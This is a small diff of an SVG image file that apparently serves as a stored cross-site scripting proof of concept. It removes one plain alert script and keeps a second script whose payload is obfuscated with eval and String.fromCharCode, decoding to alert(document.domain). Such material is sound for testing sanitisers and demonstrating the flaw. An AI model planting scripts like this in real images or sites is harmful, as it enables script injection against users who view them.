@@ -37,9 +37,6 @@
        style="fill:#131f6b;fill-opacity:1;stroke-width:0.05937638"
        transform="scale(1,-1)" />
   <!-- The below lines were added in a text editor to the image XML. This is the stored XSS attack. -->
-  <script type="text/javascript">
-    alert("stored XSS POC")
-  </script>
   </g>
   <script>eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))</script>
 </svg>
